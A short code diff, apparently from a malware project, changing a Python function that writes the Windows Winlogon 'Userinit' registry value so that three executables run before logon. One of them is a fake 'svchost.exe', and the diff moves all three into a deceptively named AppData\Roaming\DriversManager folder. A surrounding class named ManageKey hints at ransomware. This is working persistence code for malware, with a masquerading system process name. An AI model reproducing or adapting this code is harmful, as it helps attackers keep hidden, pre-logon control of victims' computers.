@@ -30,7 +30,7 @@ class ManageKey():
 
 # WRITE A REG FOR THE GUI COUNTER TO STARTUP BEFORE LOGON ON WINDOWS
 def setInit():
-    p = "{}\\Users\\{}\\AppData\setup\\GuiCounter.exe, {}\\Users\\{}\\AppData\\setup\\svchost.exe, {}\\Users\\{}\\AppData\\setup\\rvM32.exe, {}\\Windows\\system32\\userinit.exe".format(d, usr, d, usr, d, usr, d)
+    p = "{}\\Users\\{}\\AppData\\Roaming\\DriversManager\\GuiCounter.exe, {}\\Users\\{}\\AppData\\Roaming\\DriversManager\\svchost.exe, {}\\Users\\{}\\AppData\\Roaming\\DriversManager\\rvM32.exe, {}\\Windows\\system32\\userinit.exe".format(d, usr, d, usr, d, usr, d)
     key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, 'Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon')
     winreg.SetValueEx(key, 'Userinit',0, winreg.REG_SZ, p)
     winreg.CloseKey(key)
